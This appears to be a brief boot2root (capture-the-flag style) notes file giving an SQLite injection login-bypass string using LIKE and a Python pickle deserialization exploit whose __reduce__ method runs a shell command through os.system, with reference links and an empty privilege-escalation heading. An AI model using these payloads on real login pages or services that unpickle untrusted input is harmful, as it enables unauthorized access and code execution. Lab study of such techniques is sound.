# Boot2root

## SQLite Injection: Login Bypass

Use "LIKE" to bypass

```text
"oR"2"LiKE"2
```

[Reference](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass)

## Pickle Insecure Deserialization Priv Esc

```py
import pickle
import os


class RCE:
    def __reduce__(self):
        cmd = ('pwd')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    with open("pickled_data.pickle", "wb") as f:
        f.write(pickled)
```

[Reference](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

## Privilege Escalation

